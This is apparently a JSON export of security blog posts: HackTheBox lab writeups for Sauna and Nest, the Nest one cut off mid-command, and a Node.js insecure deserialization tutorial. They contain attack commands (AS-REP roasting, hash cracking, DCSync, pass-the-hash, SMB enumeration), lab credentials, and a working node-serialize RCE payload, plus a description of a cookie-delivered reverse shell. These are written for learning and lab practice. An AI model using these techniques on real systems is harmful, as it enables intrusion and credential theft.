[
  
  {
    "title": "HTB: Sauna Writeup",
    "url": "/posts/Sauna/",
    "categories": "HackTheBox, CTF",
    "tags": "Vulnerability Assessment, Active Directory, Security Tools, Authentication, Reconnaissance, User Enumeration, Password Cracking, ASREPRoasting, AD DCSync, Pass the Hash, Misconfiguration, Autologon Credentials, Enterprise Network",
    "date": "2024-09-09 05:00:00 -0700",
    





    
    "snippet": "Machine Information  SynopsisSauna is an easy difficulty Windows machine that features Active Directory enumeration and exploitation. Possible usernames can be derived from employee full names list...",
    "content": "Machine Information  SynopsisSauna is an easy difficulty Windows machine that features Active Directory enumeration and exploitation. Possible usernames can be derived from employee full names listed on the website. With these usernames, an ASREPRoasting attack can be performed, which results in hash for an account that doesn’t require Kerberos pre-authentication. This hash can be subjected to an offline brute force attack, in order to recover the plaintext password for a user that is able to WinRM to the box. Running WinPEAS reveals that another system user has been configured to automatically login and it identifies their password. This second user also has Windows remote management permissions. BloodHound reveals that this user has the DS-Replication-Get-Changes-All extended right, which allows them to dump password hashes from the Domain Controller in a DCSync attack. Executing this attack returns the hash of the primary domain administrator, which can be used with Impacket’s psexec.py in order to gain a shell on the box as NT_AUTHORITY\\\\SYSTEM.  General Information            Machine      Nest                  OS      Windows              Dificulty      Easy              Stars      4.5              Release Date      15 Feb 2020      ReconLet’s start by enumerating active services in the machine, we can use nmap in order to do this, besides of running nmap scripts, and enumerating versions.❯ sudo nmap -p- -sSVC --min-rate 7000 --min-parallelism 100 -oN machine_services.txt -n 10.10.10.175Stats: 0:01:56 elapsed; 0 hosts completed (1 up), 1 undergoing Script ScanNSE Timing: About 99.96% done; ETC: 14:27 (0:00:00 remaining)Nmap scan report for 10.10.10.175Host is up (0.28s latency).Not shown: 65515 filtered tcp ports (no-response)PORT      STATE SERVICE       VERSION53/tcp    open  domain        Simple DNS Plus80/tcp    open  http          Microsoft IIS httpd 10.0|_http-server-header: Microsoft-IIS/10.0|_http-title: Egotistical Bank :: Home| http-methods:|_  Potentially risky methods: TRACE88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-09-08 04:26:02Z)135/tcp   open  msrpc         Microsoft Windows RPC139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)445/tcp   open  microsoft-ds?464/tcp   open  kpasswd5?593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0636/tcp   open  tcpwrapped3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)3269/tcp  open  tcpwrapped5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-title: Not Found|_http-server-header: Microsoft-HTTPAPI/2.09389/tcp  open  mc-nmf        .NET Message Framing49667/tcp open  msrpc         Microsoft Windows RPC49673/tcp open  msrpc         Microsoft Windows RPC49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.049676/tcp open  msrpc         Microsoft Windows RPC49689/tcp open  msrpc         Microsoft Windows RPC49697/tcp open  msrpc         Microsoft Windows RPCService Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb2-time:|   date: 2024-09-08T04:26:55|_  start_date: N/A| smb2-security-mode:|   3:1:1:|_    Message signing enabled and required|_clock-skew: 6h59m39sService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 134.97 secondsWe can see some interesting services running on the machine. Since it is running DNS, Kerberos, LDAP, etc; we can assume that we’re dealing with a domain controller. We can also see that the server is hosting a web server, so we definitely we must take a look at it.First, let’s obtain the domain name in order to add it to our hosts file. We can use crackmapexec for this.❯ crackmapexec smb 10.10.10.175SMB         10.10.10.175    445    SAUNA            [*] Windows 10 / Server 2019 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)Now egotistical-bank.local will be resolvedWe can attempt to get null or anonymous sessions on SMB or LDAP, but note that this is likely to fail. So let’s take a look at the website…Analyzing the WebsiteIt appears to be a bank’s website, but I didn’t find anything interesting. There are some contact forms, but they don’t work, we’ll receive a Method not allowed HTTP response. I prefer to not to put effort into trying to making them work.If we scroll down in the about.html page, we will find the following:We see that there are some employee names. We can use these names to create a username wordlist to try to find valid usernames in the domain.Who knows?, they might have domain accounts, let’s figure out.To achieve this, I’ve created a basic Node.js tool that will do exactly what we need, you can download it from it’s GitHub repository:AD-Username-GeneratorGenerating a username wordlistWe can use curl and grep using LookAround expressions to easily extract the employes names the from the about webpage.Alternatively, we could simply copy the names and paste them into a file manually. I preffer to complicate things to myself.Well, once we have the employee names in a file, we can run the script to generate possible Active Directory usernames.There is also a great tool for generating this type of wordlist. You can download it from its GitHub repository if you prefer using Python: username-list-generatorNice, now that we’ve got a username wordlist, we can use Kerbrute to enumerate valid users through Kerberos. Kerbrute will request a TGT for every user in the wordlist without providing a password. If the user exists, the KDC will notify us that the user does not have the DONT_REQ_PREAUTH flag set. If the user does not exists, the KDC will return an ERR_C_PRINCIPAL_UNKNOWN error. This way, Kerbrute can determine wheter a user exists or not.Obviusly, if the user has the DONT_REQ_PREAUTH flag set, Kerbrute will mark the user as valid.Cool, we’ve enumerated one valid user, that might be enough. Let’s find out.AS-REP RoastingNow that we’ve found a valid user, we can use impacket-NPUsers to check whether FSmith requires pre-authentication or not.Great, FSmith does not require pre-authentication to request a TGT from the KDC. This means we can send a KRB_AS_REQ message without providing the user password which will let us receive a KRB_AS_REP message, which contains the TGT, and the following items encrypted with a secret key derived from the user’s password:  Session Key  TGT Expiration Time  User NonceSo, when we attempt to take advantage of a user who has the DONT_REQ_PREAUTH flag set, we’re going to focus on bruteforce the mentioned package, not directly the TGT as the TGT is encrypted using a secret key derived from the user krbtgt password, which is a very large password. Although we don’t need to worry about this, as Hashcat will do all the stuff for us but is good to know this kind of things. Anyway we can refer to this process as TGT Cracking.Here we can take a look in the KRB_AS_REP package from Wireshark:We can see that there are two encrypted parts (enc-part): one is in the ticket part, which is the TGT , and the another at the same ticket level; is the data that the user can decrypt with his password.Now if we see again the encrypted data that we obtain using impacket-NPUsers, we’ll notice that is exactly the same value that we obtain from Wireshark in the user encrypted part (59b7fd23ed…..) but with some additional information that will help cracking tools to recognize the format ($krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:).FootholdCracking the TicketTo crack the TGT we can use several tools, I prefer to use Hashcat, but John is a great option too.Hashcat need us to provide a hash mode with -m parameter. We can find the mode for AS-REP with the following command:Nice, the appropiate mode is 18200, now let’s see if we can get the password.  Used command:❯ hashcat -m 18200 -a 0 ./fsmith.kirbi  /usr/share/wordlists/rockyou.txt  Output:And we’ve got the password for the FSmith user:Thestrokes23Logging in as user FSmithNow we can use PywerView to see which domain groups FSmith belongs to.Remote Management Users… Nice, in that case let’s get shell using evil-winrm and read the user flag.Privilege EscalationSystem EnumerationNow that we’ve obtained a shell, we will proceed to enumerate the system. To do this, I’m going to use WinPeas.exe. Let’s see what we can find.If we search for the password keyword, we’ll find plain text autologon credentials for the user svc_loanmanager. I really got stuck with these credentials, because the user is actually svc_loanmgr and not svc_loanmanager , I guess the registry hive for autologons is outdated. Anyway, if we list user directories in C:\\Users\\, we’ll find the real username.Well, now let’s use evil-winrm again with these new credentials and continue enumerating with this new user.Since we have a service account we should consider using Bloodhound to easily look at that privileges do we have in the domain.I’m gonna use SharpHound to collect the domain data, you can download it from its GitHub repository:SharpHound.DCSyncIf we filter by Principals with DCSync rights, we’ll see the following:The user svc_loanmgr has DCSync rights; kinda strange permissions for a service account meant to manage loans.To exploit a domain using DCSync rights, we essentially tell the Domain Controller that we are another Domain Controller and we want to synchronize the domain database. So we request the whole database which includes absolutely all the domain information, including NTLM hashes of every account in the domain. This database is named NTDS and is present in every domain controller.So now let’s use impacket-secretsdump to dump the NTDS.PtH as AdministratorNow we can use the Administrator NTLM Hash to perform a Pass-the-Hash attack. There are a lot of tools that support authentication using NTLM hashes, I’ll use evil-winrm.This was a very easy machine, and it was enjoyable to work on, especially if you’re unfamiliar with AS-REP Roasting and DCSync."
  },
  
  {
    "title": "Insecure Deserialization: Node.js",
    "url": "/posts/InsecureDeserialization/",
    "categories": "General",
    "tags": "Web Application, Insecure Deserialization, Node.js",
    "date": "2024-09-06 05:00:00 -0700",
    





    
    "snippet": "Basic ConceptsBefore diving into insecure deserialization, we first need to understand the concepts of serialization and deserialization and what their purposes are.Serialization refers to a proces...",
    "content": "Basic ConceptsBefore diving into insecure deserialization, we first need to understand the concepts of serialization and deserialization and what their purposes are.Serialization refers to a process in which an object is converted into a format that can be easily transmitted or saved; deserialization is the opposite process, convert serialized data into a programming object.What is an object?An object in programming is basically an instance of a class; It refers to an encapsulated unit of data that has attributes and behaviors (methods and functions) that has been created using a predefined template (a class). These objects are created at runtime and are saved in our computer’s memory. Objects encapsulate the state and behaviors of data structures defined by a class.So, serialization is the process in which we take this unit of data (the class instance) from our memory and converting it into a byte stream that can be sent over a network or persist the object’s state by saving it to a file, for example.Then, deserialization refers to taking this byte stream from a file or from the network and convert it back to a class object in its original state; as we see in the image below.  refers to an ordered byte sequence that is used to represent data in a format that can be easily interpreted or processed.Practical Example: Serialization and DeserializationWe’ll be using NodeJs with the node-serialize npm package, as it has a very human-readable serialize format. On the other hand, some languages use binary serialization formats; Java for example. This makes the serialized object unreadable for humans or at least significantly less readable, as it will be represented in hex bytes, of course depending on the class used for serialize the object.For example, when we use the ObjectOutputStream class in Java to serialize an object; the serialized data may look something like this:AC ED 00 05 73 72 00 1F 6A 61 76 61 2E 75 74 696C 2E 4F 62 6A 65 63 74 24 50 65 72 73 6F 6E 0000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00With that being said, let’s see some examples.Serialization with node-serializeSo, here we have an example of object serialization using node-serialize package; we defined a class named Person with two attributes (name and age) and a method named greet, then we created a instance of the class and save in the variable carlosObj; then we serialized the object using serialize.serialize function.const serialize = require(\"node-serialize\");// Class Definitionclass Person {  constructor(name, age) {    this.name = name;    this.age = age;  }  greet() {    console.log(`Hello, I am ${this.name}`);  }}// Creating an Person instancelet carlosObj = new Person(\"Carlos\", 14);// Serializing carlosObjlet carlosObjSerialized = serialize.serialize(carlosObj);console.log(carlosObjSerialized);// Output: {\"name\":\"Carlos\",\"age\":14}But it seems like something is missing in the output… Oh right, where is the greet function?, Well, in Javascript the class functions are not stored within the class instance itself. So, carlosObj doesn’t directly store the greet function. Class functions are stored in the class prototype, this in order to save memory, as these class functions are ‘shared’ between same class instances.In order to serialize an object and perserve its functions, we need to use literal objects insetad of class objects. This is because declared functions in literal objects are stored within the object itself. So, let’s see how a serialized function looks.const serialize = require(\"node-serialize\");let luis = {  name: \"luis\",  age: 20,  greet: function () {    console.log(`Hello, I am ${this.name}`);  }};let luisSerialized = serialize.serialize(luis);console.log(luisSerialized);// Output: {\"name\":\"luis\",\"age\":20,\"greet\":\"_$$ND_FUNC$$_function () {\\n    console.log(`Hello, I am ${this.name}`);\\n  }\"}Weird… Adittionally if we want to save the serialized object in a file, it is something easy, we just need to provide three additional lines of code. Let me provide an example.const serialize = require(\"node-serialize\");const fs = require(\"fs\");let luis = {  name: \"luis\",  age: 20,  greet: function () {    console.log(`Hello, I am ${this.name}`);  }};let luisSerialized = serialize.serialize(luis);let luisSerializedBytes = Buffer.from(luisSerialized);fs.writeFileSync(\"/tmp/luis.txt\", luisSerializedBytes);We converted the serialized data into a buffer of bytes. We then used fs.writeFileSync, specifing, the path where we want to save the file, and the data we want to write.❯ cat /tmp/luis.txt───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────       │ File: /tmp/luis.txt───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────   1   │ {\"name\":\"luis\",\"age\":20,\"greet\":\"_$$ND_FUNC$$_function () {\\n    console.log(`Hello, I am ${this.name}`);\\n  }\"}───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────Deserialization with node-serializeSo, now how can we convert that data back into a Javascript object?, That’s something easy. We just need to use the unserialize function and pass a serialized object to it. Let’s first see an example using:const serialize = require(\"node-serialize\");const fs = require(\"fs\");let luis = {  name: \"luis\",  age: 20,  greet: function () {    console.log(`Hello, I am ${this.name}`);  }};let luisSerialized = serialize.serialize(luis); // This is the content of luis.txtlet luisObj = serialize.unserialize(luisSerialized);luisObj.greet();// Output: Hello, I am luisWe just passed luisSerialized as a parameter in the unserialize function; and that’s all. If we want to read the serialized object from a file, the process is quite similar.const serialize = require(\"node-serialize\");const fs = require(\"fs\");let serializedData = fs.readFileSync(\"/tmp/luis.txt\", { encoding: \"utf8\" });let luisObj = serialize.unserialize(serializedData);luisObj.greet();// Output: Hello, I am luisInsecure DeserializationInsecure Deserialization is a vulnerability that commonly occurs in web applications;this vulnerability arises when user-controllable data is deserialized without proper validations, this potentially allows an attacker to manipulate the unserialized objects behavior or even replace the serialized object with an object of a different class.Manipulating the class might result in an error, but before this happens, it is probably that the damage may be already done. Many deserialization-based attacks are completed before deserialization is finishedHow do insecure deserialization vulnerabilities arise?Deserialization-based attacks generally occur when a backend application trusts in users input and involves this data into a deserialization process. Developers should always try to avoid deserializing user-controllable data; but if this is needed, always implement mechanisms in order to validate the user input, libraries such as joi are a great option for verifying user-input.Basic ExampleAs we saw, the node-serialize package allows us to include functions in our serialized objects. This sounds good, right? Well, not at all. What happens if we pass an IIFE to the unserialize function?.. Yes, it will be executed. Let’s look an example.Generating a payloadTo achieve RCE, we can use child_process module in NodeJs and invoke exec within the function we’re serializing. Since we cannot add a IIFE directly in the object we’re serializing (becuase the function would execute when we serialize the object), we need to manually convert our function into an IIFE.We just need to add () after the closing bracket, in this case we don’t need to enclose the entire function with parenthesis. We could also need to scape backslashes.const serializer = require(\"node-serialize\");const obj = {  f: function () {    require(\"child_process\").exec(\"ls\", function () {});  }};let payload = serializer.serialize(obj);console.log(payload);Result:{\"f\":\"_$$ND_FUNC$$_function () {\\n    require(\\\"child_process\\\").exec(\\\"id\\\", function (stdin, stdout, sterr) {\\n      console.log(stdout);\\n    });\\n  }\"}Modified Output:{\"f\":\"_$$ND_FUNC$$_function () {\\\\n    require(\\\\\"child_process\\\\\").exec(\\\\\"id\\\\\", function (stdin, stdout, sterr) {\\\\n      console.log(stdout);\\\\n    });\\\\n  }()\"};Deserialize and ExecuteNow we can set up a Python HTTP server and try to get some file using curl command in the exec function and see if it works.Practical ExampleHere we have a registration form where we need to provide some information.When we submit the form, the server send us a cookie and we see the submtited information in the dialog.We can try to decode the cookie since it appears to be in base64. We see that it contains the information that we provided.The decoded data looks like JSON, so it may be deserialized in server-side…We can serialize an object that contains a function that will establish a TCP connection . If the data is deserialized without any sanitization or validation, we could potenttially achieve RCE.We need to convert our function into a IIFE and escape backslashes. Then we encode our payload in base64.Finally, we set up a TCP listener and set our payload as a cookie, when we refresh the page, the server will decode and deserialize our cookie, executing our function and sending us a shell."
  },
  
  {
    "title": "HTB: Nest Writeup",
    "url": "/posts/Nest/",
    "categories": "HackTheBox, CTF",
    "tags": "C#, Vulnerability Assessment, Source Code Analysis, Cryptography, Authentication, .NET, ADS/NTFS, SMB, Reconnaissance, Decompilation, Clear Text Credentials, Weak Cryptography, Anonymous/Guest Access, Hard-coded Credentials, Reverse Engineering",
    "date": "2024-09-03 05:00:00 -0700",
    





    
    "snippet": "Machine Information  SynopsisNest is an easy difficulty Windows machine featuring an SMB server that permits guest access. The shares can be enumerated to gain credentials for a low privileged user...",
    "content": "Machine Information  SynopsisNest is an easy difficulty Windows machine featuring an SMB server that permits guest access. The shares can be enumerated to gain credentials for a low privileged user. This user is found to have access to configuration files containing sensitive information. Another user’s password is found through source code analysis, which is used to gain a foothold on the box. A custom service is found to be running, which is enumerated to find and decrypt Administrator credentials.  General Information            Machine      Nest                  OS      Windows              Dificulty      Easy              Stars      3.9              Release Date      25 Jan 2020      ReconService EnumerationFirst we’re gonna start doing a service scan using nmap, we’re also perfoming a service version detection and executing default nmap scripts.❯ sudo nmap -p- -sSVC --min-rate 8000 --min-parallelism 100 -n -oN machine_services.txt 10.10.10.178Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-01 13:38 MSTNmap scan report for 10.10.10.178Host is up (0.091s latency).Not shown: 65533 filtered tcp ports (no-response)PORT     STATE SERVICE       VERSION445/tcp  open  microsoft-ds?4386/tcp open  unknown| fingerprint-strings:|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe:|     Reporting Service V1.2|   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest, SIPOptions:|     Reporting Service V1.2|     Unrecognised command|   Help:|     Reporting Service V1.2|     This service allows users to run queries against databases using the legacy HQK format|     AVAILABLE COMMANDS ---|     LIST|     SETDIR &lt;Directory_Name&gt;|     RUNQUERY &lt;Query_ID&gt;|     DEBUG &lt;Password&gt;|_    HELP &lt;Command&gt;1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port4386-TCP:V=7.94SVN%I=7%D=9/1%Time=66D4D0E5%P=x86_64-pc-linux-gnu%r(SF:NULL,21,\"\\r\\nHQK\\x20Reporting\\x20Service\\x20V1\\.2\\r\\n\\r\\n&gt;\")%r(GenericLSF:ines,3A,\"\\r\\nHQK\\x20Reporting\\x20Service\\x20V1\\.2\\r\\n\\r\\n&gt;\\r\\nUnrecogniSF:sed\\x20command\\r\\n&gt;\")%r(GetRequest,3A,\"\\r\\nHQK\\x20Reporting\\x20Service\\SF:x20V1\\.2\\r\\n\\r\\n&gt;\\r\\nUnrecognised\\x20command\\r\\n&gt;\")%r(HTTPOptions,3A,\"\\SF:r\\nHQK\\x20Reporting\\x20Service\\x20V1\\.2\\r\\n\\r\\n&gt;\\r\\nUnrecognised\\x20comSF:mand\\r\\n&gt;\")%r(RTSPRequest,3A,\"\\r\\nHQK\\x20Reporting\\x20Service\\x20V1\\.2\\SF:r\\n\\r\\n&gt;\\r\\nUnrecognised\\x20command\\r\\n&gt;\")%r(RPCCheck,21,\"\\r\\nHQK\\x20ReSF:porting\\x20Service\\x20V1\\.2\\r\\n\\r\\n&gt;\")%r(DNSVersionBindReqTCP,21,\"\\r\\nHSF:QK\\x20Reporting\\x20Service\\x20V1\\.2\\r\\n\\r\\n&gt;\")%rHost script results:| smb2-security-mode:|   2:1:0:|_    Message signing enabled but not required| smb2-time:|   date: 2024-09-01T20:41:39|_  start_date: 2024-09-01T19:48:36Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .We discovered two open TCP ports on the machine: SMB on port 445 and a service called Reporting Service on port 4386.Nmap scripts devealed that the Reporting Service is running version 1.2, we must keep this in mind for future attack vectors.Since SMB is a well-known protocol, it’s easier to enumerating it, so let’s start by trying to get some null sessions or annonymous logins.SMB Anonymous LoginI always use smbmap to perform this type of enumeration, since we can see what privileges we have on each share.There are many tools to perform SMB enumeration. we could also use other tools such as crackmapexec, some auxiliary msf module, etc.❯ smbmap -H \"10.10.10.178\" -u \"guest\" -p \"\"    ________  ___      ___  _______   ___      ___       __         _______   /\"       )|\"  \\    /\"  ||   _  \"\\ |\"  \\    /\"  |     /\"\"\\       |   __ \"\\  (:   \\___/  \\   \\  //   |(. |_)  :) \\   \\  //   |    /    \\      (. |__) :)   \\___  \\    /\\  \\/.    ||:     \\/   /\\   \\/.    |   /' /\\  \\     |:  ____/    __/  \\   |: \\.        |(|  _  \\  |: \\.        |  //  __'  \\    (|  /   /\" \\   :) |.  \\    /:  ||: |_)  :)|.  \\    /:  | /   /  \\   \\  /|__/ \\  (_______/  |___|\\__/|___|(_______/ |___|\\__/|___|(___/    \\___)(_______)-----------------------------------------------------------------------------SMBMap - Samba Share Enumerator v1.10.4 | Shawn Evans - ShawnDEvans@gmail.com&lt;mailto:ShawnDEvans@gmail.com&gt;                     https://github.com/ShawnDEvans/smbmap[*] Detected 1 hosts serving SMB[*] Established 1 SMB connections(s) and 1 authenticated session(s)[+] IP: 10.10.10.178:445        Name: 10.10.10.178              Status: Authenticated        Disk                                                    Permissions     Comment        ----                                                    -----------     -------        ADMIN$                                                  NO ACCESS       Remote Admin        C$                                                      NO ACCESS       Default share        Data                                                    READ ONLY        IPC$                                                    NO ACCESS       Remote IPC        Secure$                                                 NO ACCESS        Users                                                   READ ONLY[*] Closed 1 connectionsWe can see that there are non-standard shares. Additionally we have read access to Data and Users, so let’s explore…Now we proceed to download the content both shares  Data Share❯ mkdir SMB/Data -p❯ cd SMB/Data❯ smbclient \\\\\\\\10.10.10.178\\\\Data -U \"anonymous\" -NTry \"help\" to get a list of possible commands.smb: \\&gt; recurse onsmb: \\&gt; prompt offsmb: \\&gt; mget *NT_STATUS_ACCESS_DENIED listing \\IT\\*NT_STATUS_ACCESS_DENIED listing \\Production\\*NT_STATUS_ACCESS_DENIED listing \\Reports\\*getting file \\Shared\\Maintenance\\Maintenance Alerts.txt of size 48 as Shared/Maintenance/Maintenance Alerts.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)getting file \\Shared\\Templates\\HR\\Welcome Email.txt of size 425 as Shared/Templates/HR/Welcome Email.txt (1.2 KiloBytes/sec) (average 0.7 KiloBytes/sec)smb: \\&gt;  Users Share❯ smbclient \\\\\\\\10.10.10.178\\\\Users -U \"anonymous\" -NTry \"help\" to get a list of possible commands.smb: \\&gt; recurse onsmb: \\&gt; prompt offsmb: \\&gt; mget *NT_STATUS_ACCESS_DENIED listing \\Administrator\\*NT_STATUS_ACCESS_DENIED listing \\C.Smith\\*NT_STATUS_ACCESS_DENIED listing \\L.Frost\\*NT_STATUS_ACCESS_DENIED listing \\R.Thompson\\*NT_STATUS_ACCESS_DENIED listing \\TempUser\\*smb: \\&gt;Unfortunately we couldn’t retrieve any files from the Users share, but no worries, we got two files from Data, so let’s take a look…Examining Shares ContentSince the Data share contains four directories we can quickly find the files within these directories. find . -type f./Shared/Maintenance/Maintenance Alerts.txt./Shared/Templates/HR/Welcome Email.txtIf we look at the content of these files, we will find a welcome template and some instructions for accessing the user’s home folder.Aditionally we will find some credentials for the user TempUser.❯ cat \"./Shared/Maintenance/Maintenance Alerts.txt\"───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────       │ File: ./Shared/Maintenance/Maintenance Alerts.txt───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────   1   │ There is currently no scheduled maintenance work───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────❯ cat \"./Shared/Templates/HR/Welcome Email.txt\"───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────       │ File: ./Shared/Templates/HR/Welcome Email.txt───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────   1   │ We would like to extend a warm welcome to our newest member of staff, &lt;FIRSTNAME&gt; &lt;SURNAME&gt;   2   │   3   │ You will find your home folder in the following location:   4   │ \\\\HTB-NEST\\Users\\&lt;USERNAME&gt;   5   │   6   │ If you have any issues accessing specific services or workstations, please inform the   7   │ IT department and use the credentials below until all systems have been set up for you.   8   │   9   │ Username: TempUser  10   │ Password: welcome2019  11   │  12   │  13   │ Thank you  14   │ HR───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────We can use CrackMapExec to comfirm if these credentials are valid.❯ crackmapexec smb 10.10.10.178 -u \"TempUser\" -p \"welcome2019\"SMB         10.10.10.178    445    HTB-NEST         [*] Windows 7 / Server 2008 R2 Build 7601 (name:HTB-NEST) (domain:HTB-NEST) (signing:False) (SMBv1:False)SMB         10.10.10.178    445    HTB-NEST         [+] HTB-NEST\\TempUser:welcome2019Enumeration using credentialsIf we enumerate shares using the credentials we obtained, we will see that now we have access to a new share named Secure$❯ crackmapexec smb 10.10.10.178 -u \"TempUser\" -p \"welcome2019\" --sharesSMB         10.10.10.178    445    HTB-NEST         [*] Windows 7 / Server 2008 R2 Build 7601 (name:HTB-NEST) (domain:HTB-NEST) (signing:False) (SMBv1:False)SMB         10.10.10.178    445    HTB-NEST         [+] HTB-NEST\\TempUser:welcome2019SMB         10.10.10.178    445    HTB-NEST         [+] Enumerated sharesSMB         10.10.10.178    445    HTB-NEST         Share           Permissions     RemarkSMB         10.10.10.178    445    HTB-NEST         -----           -----------     ------SMB         10.10.10.178    445    HTB-NEST         ADMIN$                          Remote AdminSMB         10.10.10.178    445    HTB-NEST         C$                              Default shareSMB         10.10.10.178    445    HTB-NEST         Data            READSMB         10.10.10.178    445    HTB-NEST         IPC$                            Remote IPCSMB         10.10.10.178    445    HTB-NEST         Secure$         READSMB         10.10.10.178    445    HTB-NEST         Users           READObviously we must take a look at it, but i can tell you in advance that we will find nothing as we don’t have listing privileges.So now, we enumerate the previous shares using the credentials, we might find something intersting that we didn’t have access to before.When we download the content of Data, we will get many more files than when we did it without providing credentials.❯ smbclient \\\\\\\\10.10.10.178\\\\Data -U \"TempUser\"Password for [WORKGROUP\\TempUser]:Try \"help\" to get a list of possible commands.smb: \\&gt; prompt offsmb: \\&gt; recurse onsmb: \\&gt; mget *getting file \\Shared\\Maintenance\\Maintenance Alerts.txt of size 48 as Shared/Maintenance/Maintenance Alerts.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)getting file \\IT\\Configs\\Adobe\\editing.xml of size 246 as IT/Configs/Adobe/editing.xml (0.7 KiloBytes/sec) (average 0.4 KiloBytes/sec)getting file \\IT\\Configs\\Adobe\\Options.txt of size 0 as IT/Configs/Adobe/Options.txt (0.0 KiloBytes/sec) (average 0.3 KiloBytes/sec)getting file \\IT\\Configs\\Adobe\\projects.xml of size 258 as IT/Configs/Adobe/projects.xml (0.7 KiloBytes/sec) (average 0.4 KiloBytes/sec)getting file \\IT\\Configs\\Adobe\\settings.xml of size 1274 as IT/Configs/Adobe/settings.xml (2.4 KiloBytes/sec) (average 1.0 KiloBytes/sec)getting file \\IT\\Configs\\Atlas\\Temp.XML of size 1369 as IT/Configs/Atlas/Temp.XML (2.5 KiloBytes/sec) (average 1.3 KiloBytes/sec)getting file \\IT\\Configs\\Microsoft\\Options.xml of size 4598 as IT/Configs/Microsoft/Options.xml (9.2 KiloBytes/sec) (average 2.6 KiloBytes/sec)getting file \\IT\\Configs\\NotepadPlusPlus\\config.xml of size 6451 as IT/Configs/NotepadPlusPlus/config.xml (13.2 KiloBytes/sec) (average 4.1 KiloBytes/sec)getting file \\IT\\Configs\\NotepadPlusPlus\\shortcuts.xml of size 2108 as IT/Configs/NotepadPlusPlus/shortcuts.xml (3.9 KiloBytes/sec) (average 4.1 KiloBytes/sec)getting file \\IT\\Configs\\RU Scanner\\RU_config.xml of size 270 as IT/Configs/RU Scanner/RU_config.xml (0.7 KiloBytes/sec) (average 3.8 KiloBytes/sec)getting file \\Shared\\Templates\\HR\\Welcome Email.txt of size 425 as Shared/Templates/HR/Welcome Email.txt (1.1 KiloBytes/sec) (average 3.6 KiloBytes/sec)smb: \\&gt;We can do a recursive grep to search for some password in the retrieved files, let’s take a look:❯ grep -Hri \"password\"Data/IT/Configs/RU Scanner/RU_config.xml:  &lt;Password&gt;fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=&lt;/Password&gt;Data/Shared/Templates/HR/Welcome Email.txt:Password: welcome2019We will find the password for TempUser and another that appears to be encoded in base64. If we decode the string, we will find out that is actually encrypted and there isn’t much we can do with it.❯ xxd &lt;(base64 -d &lt;&lt;&lt; \"fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=\")00000000: 7d31 3301 f603 a33d 58ce 4aa1 4241 fa19  }13....=X.J.BA..00000010: 0158 2a9d 5763 9866 edb8 ce3f ceb2 6311  .X*.Wc.f...?..c.Aside from the files we retrieved without credentials, we’ll find that there are some configuration file in various formats. We can count how many lines each file has and focus on those that have more.❯ find . -type f -exec wc -l {} \\;2 ./Adobe/editing.xml0 ./Adobe/Options.txt2 ./Adobe/projects.xml15 ./Adobe/settings.xml2 ./Atlas/Temp.XML61 ./Microsoft/Options.xml102 ./NotepadPlusPlus/config.xml25 ./NotepadPlusPlus/shortcuts.xml5 ./RU Scanner/RU_config.xmlAnalyzing the configuration file for Notepad++ (./NotepadPlusPlus/config.xml), we can see some file paths at the end.   &lt;History nbMaxFile=\"15\" inSubMenu=\"no\" customLength=\"-1\"&gt;        &lt;File filename=\"C:\\windows\\System32\\drivers\\etc\\hosts\" /&gt;        &lt;File filename=\"\\\\HTB-NEST\\Secure$\\IT\\Carl\\Temp.txt\" /&gt;        &lt;File filename=\"C:\\Users\\C.Smith\\Desktop\\todo.txt\" /&gt;    &lt;/History&gt;Well, one of them is a SMB path, besides this file is within Secure$, a share in which we have read access, so let’s see if we can read the file…❯ smbclient \\\\\\\\10.10.10.178\\\\Secure$ -U \"TempUser\" -c \"get IT\\Carl\\Temp.txt\"Password for [WORKGROUP\\TempUser]:NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file \\IT\\Carl\\Temp.txtAs we can see, it seems that the Temp.txt file doesn’t exist. Anyway, we have discovered a folder within the Secure$ share (IT\\Carl), let’s see if we have listing rights.We found some folders, so let’s get and analyze them❯ smbclient //10.10.10.178/Secure$ -U \"TempUser\"Password for 